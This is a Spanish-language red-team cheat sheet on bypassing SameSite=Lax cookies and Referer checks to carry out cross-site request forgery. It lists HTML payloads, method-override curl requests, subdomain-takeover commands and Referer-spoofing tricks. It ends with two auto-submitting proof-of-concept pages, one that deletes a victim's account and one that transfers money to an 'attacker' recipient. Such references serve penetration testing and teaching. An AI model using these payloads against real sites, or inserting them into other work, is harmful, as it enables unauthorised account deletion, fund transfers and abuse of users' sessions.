---
aliases:
  - SameSite Bypass
  - Referer Bypass
  - Cookie SameSite Lax
tags:
  - vuln/csrf
  - technique/defense-evasion
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Cross-Site Request Forgery (CSRF)]]"
---
# CSRF - Bypass de SameSite y Referer

---

## SameSite=Lax GET-based

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<a href="https://target/api/delete?id=42">Click</a>` | GET top-level — pasa SameSite=Lax | Endpoint state-changing acepta GET. |
| `<meta http-equiv="refresh" content="0;url=https://target/api/delete?id=42">` | Auto-redirect GET sin click | Lax bypass automático. |
| `<script>window.open('https://target/api/...')</script>` | Top-level new window con cookie | Lax bypass. |
| `<form action="https://target/api/x" method="GET"><input name="_method" value="DELETE"><input name="k" value="v"></form>` | GET con method override | Combo SameSite + method override. |
| `curl -sI https://target/login \| grep -i set-cookie` (verificar atributo SameSite) | Confirma policy | Pre-attack policy check. |
| Probe Lax 2-min window: login fresh + inmediatamente PoC cross-site POST | Chrome trata cookie como None por 2 min post-set | Race window post-login. |
| `curl -X POST -b "cookie" https://target/api/x` desde origen distinto + verificar si llega cookie | Test SameSite enforcement | Defense check. |
^csrf-bypass-samesite-lax

---

## Method Override

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -X POST -H "X-HTTP-Method-Override: DELETE" -b "cookie" https://target/api/x -d "k=v"` | Backend interpreta como DELETE | Spring/Symfony con override habilitado. |
| `curl -X POST -b "cookie" https://target/api/x -d "_method=DELETE&k=v"` | Body field method override | Rails / Laravel. |
| `curl -X POST -b "cookie" "https://target/api/x?_method=DELETE" -d "k=v"` | Query string method override | Generic pattern. |
| `for h in 'X-HTTP-Method-Override' 'X-Method-Override' 'X-HTTP-Method' 'X-Override-Method'; do curl -X POST -H "$h: DELETE" ... ; done` | Probe variantes de header | Multi-naming convention. |
| `<form action="https://target/api/x" method="GET"><input name="_method" value="DELETE"></form>` | GET (Lax safe) + override → backend DELETE | Combo SameSite + override. |
| `<form action="https://target/api/x" method="POST"><input name="_method" value="DELETE"></form>` cross-site | POST con override + cookies | Standard CSRF + override. |
^csrf-bypass-method-override

### PoC SameSite=Lax + method override

```html
<form action="https://target.com/api/account" method="GET">
  <input name="_method" value="DELETE">
  <input name="confirm" value="yes">
</form>
<script>document.forms[0].submit()</script>
```

GET top-level con cookie → backend convierte a DELETE → cuenta borrada.

---

## Subdomain Abuse

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `curl -sI https://target/login \| grep -i set-cookie` y verificar `Domain=.target.com` | Cookie alcanza todos los subdomains | Pre-attack check. |
| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c subjack-fingerprints.json -v 3` | Dangling subdomain detection | Setup para SDT chain. |
| Post-takeover: `<script>fetch('https://app.target.com/api/x', {credentials:'include'})</script>` desde `pwned.target.com` | CSRF "same-site" via subdomain bajo control | Subdomain takeover successful. |
| XSS en `blog.target.com` → fetch a `app.target.com` con cookies | Same-site CSRF chain via XSS | XSS en subdomain. |
| `curl -sI https://cdn.target.com/upload -d @evil.html` (probe upload vector) | File upload XSS en CDN subdomain | Self-hosted XSS payload. |
| `dig +short cnames.target.com` y verificar dangling | DNS recon dangling | Pre-takeover. |
| `nuclei -t http/takeovers/ -u https://*.target.com` | Templates específicos de takeover | Bulk vuln scan. |
^csrf-bypass-subdomain

---

## Referer Strip / Referrer-Policy

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<meta name="referrer" content="no-referrer">` en página atacante | Browser no manda Referer | Backend rejecta si Referer ausente con bug fail-open. |
| Header response: `Referrer-Policy: no-referrer` (server-side) | Same effect server-side | Atacante controla server. |
| `<a href="..." rel="noreferrer">` per-link | Strip Referer en click específico | Outbound link control. |
| `<a href="data:text/html,<script>fetch('https://target/...')</script>">` | data: scheme strip Referer cross-origin | Combo data URL. |
| `<a href="http://target/...">` desde HTTPS atacante (downgrade) | Browser strip Referer en HTTPS→HTTP | Downgrade mixed-content. |
| `curl -X POST -H "Referer: https://target.com.attacker.com/" ...` | Bypass regex sin anchor | Backend regex `^https://target.com` matchea suffix attack. |
| `curl -X POST -H "Referer: https://target.com@attacker.com/" ...` | Userinfo `@` confusion | Backend parser distinto al browser. |
| `curl -X POST -H "Referer: https://attacker.com/#https://target.com" ...` | Fragment matching bypass | Regex sobre fragment. |
| `curl -X POST -H "Referer: " ...` (empty Referer) | Empty Referer fail-open | Backend rejecta missing pero acepta empty. |
^csrf-bypass-referer

### PoC con meta referrer

```html
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
</head>
<body>
  <form action="https://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>document.forms[0].submit()</script>
</body>
</html>
```

---
